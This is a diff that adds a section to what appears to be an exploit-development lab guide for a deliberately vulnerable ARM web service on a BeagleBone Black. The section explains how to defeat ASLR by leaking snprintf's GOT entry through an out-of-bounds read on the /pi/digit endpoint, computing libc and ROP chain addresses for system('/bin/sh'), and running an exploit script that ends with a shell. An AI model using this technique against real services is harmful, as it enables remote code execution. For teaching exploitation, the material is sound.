@@ -503,6 +503,158 @@ Type `exit` to return from the shell; the webservice handler thread will resume
 and the service process will segfault (its stack frame is corrupted), which is
 expected.
 
+== Defeating ASLR with the OOB Read Primitive
+
+The exploit above relies on ASLR being disabled.  With `randomize_va_space=2`
+the libc base address changes on every run, invalidating the hardcoded gadget,
+`system()`, and `/bin/sh` addresses.  The `GET /pi/digit` endpoint provides a
+one-byte arbitrary-read primitive that can be used to leak a runtime libc
+address from the GOT and defeat ASLR entirely.
+
+=== Why the GOT contains a runtime libc address
+
+The binary is non-PIE, so the Global Offset Table (GOT) is at a fixed virtual
+address regardless of ASLR.  Each PLT entry initially points back to the PLT
+resolver; on first call the dynamic linker resolves the symbol and writes the
+real runtime address into the GOT slot.  Reading any resolved GOT slot gives a
+runtime libc address, which reveals the libc base.
+
+=== Locating the GOT slot and the digit buffer
+
+[source,bash]
+----
+# GOT slot for snprintf (called by every response handler — always resolved)
+arm-linux-gnueabihf-readelf -r rop-webservice-bbb | grep snprintf
+----
+
+Output:
+
+----
+00026c64  00004116 R_ARM_JUMP_SLOT   00000000   snprintf@GLIBC_2.4
+----
+
+[source,bash]
+----
+# g_pi_calc symbol address
+arm-linux-gnueabihf-objdump -t rop-webservice-bbb | grep g_pi_calc
+----
+
+Output:
+
+----
+00026d10 g     O .bss    000f4254    g_pi_calc
+----
+
+The `m_digits` field offset within `PiCalculator` is confirmed by disassembling
+`digit_at`:
+
+[source,bash]
+----
+arm-linux-gnueabihf-objdump -d rop-webservice-bbb | grep -A12 "<_ZNK12PiCalculator8digit_atEi>"
+----
+
+The key instruction is `adds r3, #16` — `m_digits` is at offset 16 (0x10)
+from the struct base:
+
+----
+   13f1a:  add  r3, r2        ; r3 = this + idx
+   13f1c:  adds r3, #16       ; r3 = this + idx + 16  (m_digits field)
+   13f1e:  ldrb r3, [r3, #0]  ; load one byte
+----
+
+Therefore:
+
+----
+M_DIGITS_ADDR = g_pi_calc + 16 = 0x00026d10 + 0x10 = 0x00026d20
+SNPRINTF_GOT  = 0x00026c64
+DELTA         = SNPRINTF_GOT − M_DIGITS_ADDR = −188
+----
+
+=== Computing the OOB read n-values
+
+The handler calls `digit_at(n − 1)`, which returns `m_digits[n − 1]`.  To
+read `m_digits[DELTA + i]` (= byte `i` of `snprintf@GOT`) the endpoint must
+receive `n = DELTA + i + 1`:
+
+[cols="1,2,2"]
+|===
+|Byte |n value |Address read
+
+|0 |−187 |`m_digits[−188]` = `0x00026c64` (`snprintf@GOT+0`)
+|1 |−186 |`m_digits[−187]` = `0x00026c65` (`snprintf@GOT+1`)
+|2 |−185 |`m_digits[−186]` = `0x00026c66` (`snprintf@GOT+2`)
+|3 |−184 |`m_digits[−185]` = `0x00026c67` (`snprintf@GOT+3`)
+|===
+
+Assembling the four bytes little-endian gives the runtime address of `snprintf`
+in libc.
+
+=== Computing libc base and all ROP addresses
+
+[source,bash]
+----
+# snprintf libc offset (Thumb symbol — bit0=1 stored verbatim in GOT)
+arm-linux-gnueabihf-readelf -s /tmp/libc-bbb.so | grep "snprintf@@"
+# → 0x00038e3d
+----
+
+[source]
+----
+libc_base = leaked_snprintf − 0x38e3d
+----
+
+Sanity check: `libc_base & 0xfff` must equal zero — libc is always mapped at a
+page boundary on ARM32.  A non-zero result means the GOT slot has not yet been
+resolved (still holds the PLT stub address).
+
+All three ROP addresses then follow from the same offsets used in the
+ASLR-disabled chain:
+
+----
+GADGET = libc_base + 0x59cfc   (pop {r0, r4, pc} — ARM mode, bit0=0)
+BINSH  = libc_base + 0xcd660   ("/bin/sh" string)
+SYSTEM = libc_base + 0x2e211   (system() — Thumb, bit0=1)
+----
+
+=== Running the ASLR bypass exploit
+
+Enable ASLR on the BBB:
+
+[source,bash]
+----
+ssh <user>@<bbb-ip> \
+  "echo 2 | sudo tee /proc/sys/kernel/randomize_va_space"
+----
+
+Then run the exploit — it SSHes to the BBB first to confirm ASLR is active:
+
+[source,bash]
+----
+python3 demos/aslr_bypass.py http://<bbb-ip>:8080 <ssh-user> <ssh-password>
+----
+
+Expected output in Terminal B:
+
+----
+[*] Checking ASLR on 192.168.7.2 via SSH (embed) …
+[+] ASLR confirmed enabled (randomize_va_space=2)
+[+] Service alive: {'running': False, 'digit': 0, 'place': 0}
+
+[*] Leaking snprintf@GOT via /pi/digit  (n = [-187, -186, -185, -184])
+[+] snprintf runtime address : 0xb6f27e3d
+[+] libc base    : 0xb6eef000
+[+] gadget       : 0xb6f48cfc  (libc+0x59cfc, ARM, bit0=0)
+[+] "/bin/sh"    : 0xb6fbC660  (libc+0xcd660)
+[+] system()     : 0xb6f1d211  (libc+0x2e211, Thumb)
+
+[*] Sending exploit → http://192.168.7.2:8080/pi/start …
+[*] (ReadTimeout) — system() is running, shell active on BBB
+----
+
+The libc base (`0xb6eef000` above) will differ from the ASLR-disabled value
+(`0xb6d5b000`) and will change on every service restart — the exploit adapts
+automatically.
+
 == Key Pitfalls Encountered
 
 The following problems arose during development and are documented here to aid
